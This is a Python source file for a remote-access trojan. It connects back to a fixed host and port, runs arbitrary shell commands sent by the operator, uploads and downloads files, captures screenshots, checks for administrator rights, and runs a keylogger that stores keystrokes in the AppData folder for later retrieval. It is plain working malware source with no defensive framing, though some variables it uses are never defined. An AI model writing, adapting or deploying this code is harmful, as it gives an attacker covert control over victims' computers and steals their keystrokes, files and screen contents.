#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import pyautogui
import pynput.keyboard

def process_keys(key):
        global keys
        try:
                keys = keys + str(key.char)
        except AttributeError:
                if key == key.space:
                        keys = keys + " "
                elif key == key.enter:
                        keys = keys + ""
                elif key == key.right:
                        keys = keys + ""
                elif key == key.left:
                        keys = keys + ""
                elif key == key.down:
                        keys = keys + ""
                elif key == key.up:
                        keys = keys + ""
                else:
                        keys = keys + " " + str(key) + " "


def Pout():
        global keys
        fin.write(keys)
        keys = ""
        timer.start()

def Start():
        global path
        keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
        with keyboard_listener:
                with open(path, "a") as fin:
                        Pout()
                        keyboard_listener.join()

def reliable_send(data):
        json_data = json.dumps(data)
        s.send(json_data.encode())

def reliable_send_b64(data):
        json_data = json.dumps(data)
        s.send(base64.b64encode(json_data.encode()))

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + s.recv(1024).decode()
                        return json.loads(json_data)
                except ValueError:
                        continue

def reliable_recv_b64():
        json_data = ""
        while True:
                try:
                        json_data = json_data + base64.b64decode(s.recv(1024).decode())
                        return json.loads(json_data)
                except ValueError:
                        continue

def screenshot():
	mySc = pyautogui.screenshot()
	mySc.save(r'monitor-1.png')

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		admin = "[!!] User Privileges"
	else:
		admin = "[+] Administrator Privileges"

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(("192.168.1.6", 54321))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv()
		if command == "ext":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command == "help":
			help_options = '''                                           download <path> -> Download a file from target PC
					   upload <path>   -> Upload a file to target PC(Still buggy)
					   get <url>       -> Download file to target any website
					   start <path>    -> Start program on target PC
					   screenshot      -> Take a screenshot of target's monitor
					   check           -> Check for administrator privileges(Still to be tested '''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded file from specified URL!")
			except:
				reliable_send("[!!] Failed to download file")
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				try:
					fin.write(reliable_recv_b64())
				except Exception as e:
					try:
						reliable_send(str(e))
					except:
						reliable_send("That's not how you send exception errors!!")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started!")
			except:
				reliable_send("[-] Failed to start!")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[--] Failed to take screenshot!")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Can't perform the check!")
		elif command[:12] == "keylog_start":
			try:
				Start()
			except:
				reliable_send("Something is amiss")
		elif command[:11] == "keylog_dump":
			try:
				fn = open(path, "r")
				reliable_send(fn.read())
			except:
				reliable_send("Can't open file. Does it exist?")
		else:
			try:
				proc = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result.decode())
			except:
				reliable_send("[!!] Can't execute that command")

keys = ""
path = os.environ["appdata"] + "\keylogger.txt"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
s.close()
